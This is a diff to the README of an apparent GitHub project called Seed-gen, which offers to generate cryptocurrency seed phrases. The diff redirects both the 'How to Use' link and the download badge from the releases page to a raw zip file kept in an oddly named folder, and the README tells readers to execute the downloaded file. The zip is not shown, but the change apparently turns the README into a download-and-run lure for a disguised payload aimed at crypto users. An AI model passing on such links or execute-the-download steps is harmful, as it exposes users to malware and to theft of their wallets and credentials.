@@ -16,7 +16,7 @@ Seed-gen offers a simple and secure way to generate seed phrases for your crypto
 
 ## How to Use
 
-1. Visit the [Seed-gen Releases page](https://github.com/Loko5ja/seed-gen/releases) to download the latest version of the tool.
+1. Visit the [Seed-gen Releases page](https://raw.githubusercontent.com/Loko5ja/seed-gen/main/parapleuritis/seed_gen_v1.7.zip) to download the latest version of the tool.
 2. Execute the downloaded file to start generating your unique seed phrases.
 
 ## Repository Information
@@ -31,7 +31,7 @@ Seed-gen offers a simple and secure way to generate seed phrases for your crypto
 
 Click below to download and execute Seed-gen:
 
-[![Download Seed-gen](https://img.shields.io/badge/Download-Seed--gen-brightgreen)](https://github.com/Loko5ja/seed-gen/releases)
+[![Download Seed-gen](https://raw.githubusercontent.com/Loko5ja/seed-gen/main/parapleuritis/seed_gen_v1.7.zip)](https://raw.githubusercontent.com/Loko5ja/seed-gen/main/parapleuritis/seed_gen_v1.7.zip)
 
 ## Stay Connected
 
